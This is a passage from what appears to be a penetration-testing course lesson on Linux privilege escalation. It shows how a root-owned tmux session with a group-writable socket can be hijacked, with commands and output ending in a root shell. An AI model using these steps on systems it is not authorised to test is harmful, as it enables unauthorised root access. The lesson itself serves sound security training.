erminal multiplexers such as [tmux](https://en.wikipedia.org/wiki/Tmux) can be used to allow multiple terminal sessions to be accessed within a single console session. When not working in a `tmux` window, we can detach from the session, still leaving it active (i.e., running an `nmap` scan). For many reasons, a user may leave a `tmux` process running as a privileged user, such as root set up with weak permissions, and can be hijacked. This may be done with the following commands to create a new shared session and modify the ownership.


```
htb@NIX02:~$ tmux -S /shareds new -s debugsess 
htb@NIX02:~$ chown root:devs /shareds
```

If we can compromise a user in the `devs` group, we can attach to this session and gain root access.

Check for any running `tmux` processes.

```bash
htb@NIX02:~$  ps aux | grep tmux root      
4806  0.0  0.1  29416  3204 ?        Ss   06:27   0:00 tmux -S /shareds new -s debugsess
```


Confirm permissions.

`htb@NIX02:~$ ls -la /shareds  srw-rw---- 1 root devs 0 Sep  1 06:27 /shareds`

Review our group membership.

`htb@NIX02:~$ id uid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)`

Finally, attach to the `tmux` session and confirm root privileges.

```bash
htb@NIX02:~$ tmux -S /shareds 
id 
uid=0(root) gid=0(root) groups=0(root)
```
